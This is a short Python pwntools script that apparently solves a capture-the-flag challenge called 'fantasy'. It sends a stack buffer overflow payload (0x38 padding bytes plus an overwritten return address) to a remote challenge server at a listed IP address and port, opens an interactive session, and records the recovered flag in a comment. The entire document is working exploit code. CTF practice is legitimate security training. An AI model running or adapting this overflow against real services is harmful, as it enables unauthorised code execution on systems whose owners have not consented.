#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 0
# context(log_level="debug", arch="amd64", os="linux")
if debug == 1:
    p = process('./fantasy')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('183.129.189.60', 10025)

pd = 'a' * 0x38
pd += p64(0x400735)
p.sendafter('input your message\n', pd)
p.recv()
p.interactive()
# GXY{Welcome_to_Binary_world}